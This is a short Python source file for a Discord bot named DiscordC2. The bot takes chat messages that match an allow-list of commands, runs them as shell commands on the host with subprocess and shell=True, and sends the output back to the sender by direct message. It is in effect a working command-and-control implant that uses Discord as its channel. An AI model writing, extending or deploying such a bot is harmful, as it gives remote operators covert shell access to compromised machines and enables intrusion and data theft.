import discord
import subprocess
from bot_token import *
from commands import *


class DiscordC2(discord.Client):

    async def on_message(self, message):
        if message.author.bot:
            return
        cmd = '{0.content}'.format(message)
        """
        Current if statement to allow for only authorized commands by the server.
        It should be possible to import this from an external file.
        """
        if message.content in AUTHORIZED_COMMANDS:
            p = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                 stderr=subprocess.STDOUT, close_fds=True)
            result = p.stdout.read().decode("utf-8")
            await message.author.send(result)
        else:
            await message.author.send('Not an authorized command.')


def main():
    client = DiscordC2()
    client.run(BOT_TOKEN)


if __name__ == '__main__':
    main()
